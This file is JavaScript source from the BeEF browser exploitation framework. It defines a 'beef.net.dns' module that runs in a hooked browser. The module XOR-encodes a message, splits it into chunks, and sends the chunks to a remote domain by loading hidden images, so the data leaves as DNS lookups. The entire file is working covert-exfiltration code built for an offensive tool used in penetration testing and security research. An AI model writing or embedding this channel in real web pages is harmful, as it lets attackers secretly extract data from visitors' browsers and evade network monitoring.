//
//   Copyright 2011 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.net.dns
 * 
 * request object structure:
 * + msgId: {Integer} Unique message ID for the request.
 * + domain: {String} Remote domain to retrieve the data.
 * + wait: {Integer} Wait time between requests (milliseconds) - NOT IMPLEMENTED
 * + callback: {Function} Callback function to receive the number of requests sent.
 */

beef.net.dns = {

	handler: "dns",

	send: function(msgId, messageString, domain, wait, callback) {

		var dom = document.createElement('b');

		// DNS settings
		var max_domain_length = 255-5-5-5-5-5;
		var max_segment_length = max_domain_length - domain.length;

		// splits strings into chunks
		String.prototype.chunk = function(n) {
			if (typeof n=='undefined') n=100;
			return this.match(RegExp('.{1,'+n+'}','g'));
		};

		// XORs a string
		xor_encrypt = function(str, key) {
			var result="";
			for(i=0;i<str.length;++i) {
				result+=String.fromCharCode(key^str.charCodeAt(i));
			}
			return result;
		};

		// sends a DNS request
		sendQuery = function(query) {
			//console.log("Requesting: "+query);
			var img = new Image;
			img.src = "http://"+query;
			img.onload = function() { dom.removeChild(this); }
			img.onerror = function() { dom.removeChild(this); }
			dom.appendChild(img);
		}

		// encode message
		var xor_key = Math.floor(Math.random()*99000+1000);
		encoded_message = encodeURI(xor_encrypt(messageString, xor_key)).replace(/%/g,".");

		// Split message into segments
		segments = encoded_message.chunk(max_segment_length)
		for (seq=1; seq<=segments.length; seq++) {
			// send segment
			sendQuery(msgId+"."+seq+"."+segments.length+"."+xor_key+segments[seq-1]+"."+domain);
		}

		// callback - returns the number of queries sent
		if (!!callback) callback(segments.length);

	}

};

beef.regCmp('beef.net.dns');

